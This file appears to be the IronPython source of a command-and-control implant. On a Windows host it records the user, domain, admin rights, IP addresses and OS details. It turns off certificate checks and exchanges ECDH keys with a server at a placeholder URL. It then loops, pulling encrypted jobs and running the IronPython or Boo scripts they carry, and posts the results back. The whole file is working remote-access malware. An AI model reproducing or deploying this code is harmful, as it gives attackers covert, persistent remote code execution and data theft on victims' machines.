# -*- coding: utf-8 -*-

import clr
from System import Convert, Guid, Environment, Uri, Console, Array, Byte, Random, IntPtr

clr.AddReference("BouncyCastle.Crypto")
clr.AddReference("IronPython")
clr.AddReference("System.Management")
clr.AddReference("System.Web.Extensions")
clr.AddReference("Boo.Lang.Interpreter")

from System.Text import Encoding
from System.Diagnostics import Process
from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
from System.Net.Security import RemoteCertificateValidationCallback
from System.Threading import Thread
from System.Security.Cryptography import Aes, PaddingMode, CryptoStream, CryptoStreamMode, AsymmetricAlgorithm, HMACSHA256, RNGCryptoServiceProvider
from System.Threading.Tasks import Task
from System.Web.Script.Serialization import JavaScriptSerializer
from IronPython.Hosting import Python
from Boo.Lang.Interpreter import InteractiveInterpreter
from Microsoft.Win32 import Registry

from System.Text.RegularExpressions import Regex
from System import StringComparison

from Org.BouncyCastle.Crypto.Parameters import ECKeyGenerationParameters, ECDomainParameters, ECPublicKeyParameters
from Org.BouncyCastle.Security import GeneratorUtilities, SecureRandom, AgreementUtilities
from Org.BouncyCastle.Asn1.Sec import SecNamedCurves, SecObjectIdentifiers
from Org.BouncyCastle.Math import BigInteger
from Org.BouncyCastle.Crypto.Digests import Sha256Digest
from Org.BouncyCastle.Crypto.Agreement import ECDHBasicAgreement

def urljoin(base, suffix):
    return "{}/{}".format(base, suffix)

def print_traceback():
    try:
        traceback.print_exc()
    except NameError:
        pass


class EngineStream(Stream):
    def __init__(self):
        self.string = ''

    def Write(self, bytes, offset, count):
        # Turn the byte-array back into a string
        self.string += Encoding.UTF8.GetString(bytes, offset, count)

    @property
    def CanRead(self):
        return False

    @property
    def CanSeek(self):
        return False

    @property
    def CanWrite(self):
        return True

    def Flush(self):
        pass

    def Close(self):
        pass

    @property
    def Position(self):
        return 0


class NotSerializable(Exception):
    pass


class CryptoException(Exception):
    pass


class Serializable(object):
    def __serialize__(self):
        class_dict = {}
        for key in [key for key in self.__dict__.keys() if not key.startswith('__') and key.isupper()]:
            value = getattr(self, key)
            if not callable(value):
                class_dict[key.lower()] = value.__serialize__() if hasattr(value, '__serialize__') else value

        return class_dict

#
#
# Comms Section
#
#


class Response(object):
    def __init__(self, response):
        self.response = response

    @property
    def text(self):
        return StreamReader(self.response.GetResponseStream()).ReadToEnd()

    @property
    def bytes(self):
        with MemoryStream() as memstream:
            self.response.GetResponseStream().CopyTo(memstream)
            return memstream.ToArray()


class Requests(object):
    def __init__(self, verify=False, proxy_aware=True, ssl_versions=SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12):
        self.proxy_aware = proxy_aware
        ServicePointManager.SecurityProtocol = ssl_versions
        if not verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)

    def post(self, url, payload=None):
        r = WebRequest.Create(url)
        r.ContentType = "application/octet-stream"
        r.Method = "POST"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        if len(payload):
            if type(payload) != Array[Byte]:
                data = Encoding.UTF8.GetBytes(payload)
            else:
                data = payload

            r.ContentLength = data.Length
            requestStream = r.GetRequestStream()
            requestStream.Write(data, 0, data.Length)
            requestStream.Close()

        return Response(r.GetResponse())

    def get(self, url):
        r = WebRequest.Create(url)
        r.ContentType = "application/octet-stream"
        r.Method = "GET"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        return Response(r.GetResponse())


class Crypto(object):
    def __init__(self):
        x9EC = SecNamedCurves.GetByName("secp521r1")
        self.aliceKeyPair = self.GenerateKeyPair(ECDomainParameters(x9EC.Curve, x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed()))
        self.bobPublicKey = self.GetBobPublicKey(URL, x9EC, self.aliceKeyPair.Public)

        self.derived_key = self.derive_key(self.bobPublicKey, self.aliceKeyPair.Private)

    def GenerateKeyPair(self, ecDomain):
        g = GeneratorUtilities.GetKeyPairGenerator("ECDH")
        g.Init(ECKeyGenerationParameters(ecDomain, SecureRandom()))

        return g.GenerateKeyPair()

    def GetBobPublicKey(self, url, x9EC, alicePublicKey):
        requests = Requests()

        alice_x = str(alicePublicKey.Q.Normalize().AffineXCoord)
        alice_y = str(alicePublicKey.Q.Normalize().AffineYCoord)
        json = "{'x': \"" + alice_x + "\",'y': \"" + alice_y +"\"}"

        response = requests.post(url, Encoding.UTF8.GetBytes(json)).text
        response = response.replace("\"", "'")

        r = Regex("': (.+?) ")
        mcx = r.Matches(response)
        x = BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", ""))

        y = BigInteger(response.Substring(response.LastIndexOf(": ", StringComparison.Ordinal) + 1).Replace("}", "").Trim())

        return ECPublicKeyParameters("ECDH", x9EC.Curve.ValidatePoint(x,y).Normalize(), SecObjectIdentifiers.SecP521r1)

    def derive_key(self, bobPublicKey, alicePrivateKey):
        aKeyAgree = ECDHBasicAgreement()
        aKeyAgree.Init(alicePrivateKey)
        sharedSecret = aKeyAgree.CalculateAgreement(bobPublicKey)
        sharedSecretBytes = sharedSecret.ToByteArray()

        digest = Sha256Digest()
        symmetricKey = Array.CreateInstance(Byte, digest.GetDigestSize())
        digest.BlockUpdate(sharedSecretBytes, 0, sharedSecretBytes.Length)
        digest.DoFinal(symmetricKey, 0)

        return symmetricKey

    def HMAC(self, key, message):
        with HMACSHA256(key) as hmac:
            return hmac.ComputeHash(message)

    def AesEncryptData(self, cleartext, key, iv):
        with Aes.Create() as aesAlg:
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV)

            with MemoryStream() as encryptedData:
                with CryptoStream(encryptedData, encryptor, CryptoStreamMode.Write) as cryptoStream:
                    cryptoStream.Write(cleartext, 0, cleartext.Length)
                    cryptoStream.FlushFinalBlock()
                    return encryptedData.ToArray()

    def AesDecryptData(self, ciphertext, key, iv):
        with Aes.Create() as aesAlg:
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV)

            with MemoryStream() as decryptedData:
                with CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write) as cryptoStream:
                    cryptoStream.Write(ciphertext, 0, ciphertext.Length)
                    cryptoStream.FlushFinalBlock()
                    return decryptedData.ToArray()

    def Encrypt(self, data):
        iv = Array.CreateInstance(Byte, 16)
        RNGCryptoServiceProvider().GetBytes(iv)

        if type(data) != Array[Byte]:
            data = Encoding.UTF8.GetBytes(data)

        ciphertext = self.AesEncryptData(data, self.derived_key, iv)
        hmac = self.HMAC(self.derived_key, iv + ciphertext)

        return iv + ciphertext + hmac

    def Decrypt(self, data):
        iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]

        if hmac == self.HMAC(self.derived_key, iv + ciphertext):
            return self.AesDecryptData(ciphertext, self.derived_key, iv)

        raise CryptoException("Invalid HMAC when decrypting data")


class Comms(Serializable):
    def __init__(self, sleep):
        self.sleep = sleep
        self.requests = Requests()
        self.crypto = None

        # Listener URLs
        self.base_url = URL  # This needs to be a tuple of callback domains (eventually)
        self.jobs_url = Uri(urljoin(self.base_url, 'jobs'))

    def key_exchange(self):
        while True:
            try:
                self.crypto = Crypto()
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing key exchange: " + str(e)
                    print_traceback()

            Thread.Sleep(self.sleep)

    def send_job_results(self, results, job_id):
        self.key_exchange()

        if type(results) == dict:
            results = JavaScriptSerializer().Serialize(results)
        elif hasattr(results, '__serialize__'):
            results = JavaScriptSerializer().Serialize(results.__serialize__())

        encrypted_results = self.crypto.Encrypt(results)
        job_url = Uri(urljoin(self.jobs_url, job_id))

        while True:
            try:
                self.requests.post(job_url, payload=encrypted_results)
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing sending job results: " + str(e)
                    print_traceback()

            Thread.Sleep(self.sleep)

    def get_job(self):
        self.key_exchange()

        while True:
            try:
                job = self.requests.get(self.jobs_url).bytes
                if len(job):
                    return JavaScriptSerializer().DeserializeObject(Encoding.UTF8.GetString(self.crypto.Decrypt(job)))
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing getting jobs: " + str(e)
                    print_traceback()

            Thread.Sleep(self.sleep)

    def __str__(self):
        return 'http'

    def __serialize__(self):
        return self.__str__()

#
#
# End Comms Section
#
#


class STJob(Serializable):
    def __init__(self, client, job):
        self.JOB = job
        self.ID = job['id']
        self.STATE = 'Initializing'

        self.__client = client
        self.__t = Task[long](lambda: self.run(job))
        self.__t.Start()

    def run(self, job):
        if DEBUG: print "Running job (id: {})".format(self.ID)

        payload = {'id': self.ID}
        try:
            self.STATE = 'Running'
            result = getattr(self, job['cmd'])(job['args'])
            self.STATE = 'Executed'
            payload['state'] = 'success'
            payload['result'] = result
        except AttributeError as e:
            print_traceback()
            self.STATE = 'Error'
            payload['state'] = 'error'
            payload['result'] = 'Unknown command {}'.format(job['cmd'], e)
        except Exception as e:
            print_traceback()
            self.STATE = 'Error'
            payload['state'] = 'error'
            payload['result'] = 'Exception when executing command {}: {}'.format(job['cmd'], e)

        self.STATE = 'Sending Results'
        self.__client.COMMS.send_job_results(payload, self.ID)
        self.STATE = 'Completed'

    def run_ipy_script(self, args):
        engine_stream = EngineStream()

        engine = Python.CreateEngine()
        engine.Runtime.IO.SetOutput(engine_stream, Encoding.UTF8)
        engine.Runtime.IO.SetErrorOutput(engine_stream, Encoding.UTF8)
        #scope = engine.CreateScope()
        #scope.SetVariable("client", self)

        engine.Execute(args)
        return engine_stream.string

    def run_boo_script(self, args):
        interpreter = InteractiveInterpreter()
        interpreter.Eval(args)
        return interpreter.GetValue("output")

    def get_jobs(self, args):
        return self.__client.JOBS

    def checkin(self, args):
        return self.__client.__serialize__()

    def sleep(self, args):
        self.__client.SLEEP = int(args)
        return "Updated"

    def kill(self):
        self.__t.Stop()

    def __str__(self):
        return "<Job {} ({})>".format(self.ID, self.STATE)

    def __repr__(self):
        return "<Job {} ({})>".format(self.ID, self.STATE)


class STClient(Serializable):
    def __init__(self):
        self.__process = Process.GetCurrentProcess()
        self.__jobs = []

        self.GUID = GUID
        self.SLEEP = 5000
        #self.JITTER = 5000
        self.TYPE = 'ipy'
        self.USERNAME = Environment.UserName
        self.DOMAIN = Environment.UserDomainName
        self.DOTNET_VERSION = str(Environment.Version)
        self.HIGH_INTEGRITY = self.is_high_integrity()
        self.IP = self.get_network_addresses()
        self.OS = "{} ({})".format(Environment.OSVersion.ToString(), Environment.OSVersion.Version)
        self.OS_ARCH = "x64" if IntPtr.Size == 8 else "x86"
        try:
            self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
        except:
            self.OS_RELEASE_ID = ""
        self.PROCESS = self.__process.Id
        self.PROCESS_NAME = self.__process.ProcessName
        self.HOSTNAME = Environment.MachineName
        self.JOBS = len(self.__jobs)
        self.URL = str(URL)
        self.COMMS = Comms(self.SLEEP)

        self.main()

    def is_high_integrity(self):
        identity = WindowsIdentity.GetCurrent()
        principal = WindowsPrincipal(identity)
        return principal.IsInRole(WindowsBuiltInRole.Administrator)

    def get_network_addresses(self):
        addresses = []
        interfaces = NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
        for iface in interfaces:
            properties = iface.GetIPProperties()
            addresses.extend([uni.Address.ToString() for uni in properties.UnicastAddresses if uni.Address.AddressFamily.ToString() == "InterNetwork" and uni.Address.ToString() != '127.0.0.1'])
        return addresses

    def gen_random_string(self, length=8):
        return Guid.NewGuid().ToString("n").Substring(0, length)

    def main(self):
        while True:
            job = self.COMMS.get_job()
            if job:
                self.__jobs.append(STJob(self, job))

            Thread.CurrentThread.Join(self.SLEEP)


STClient()
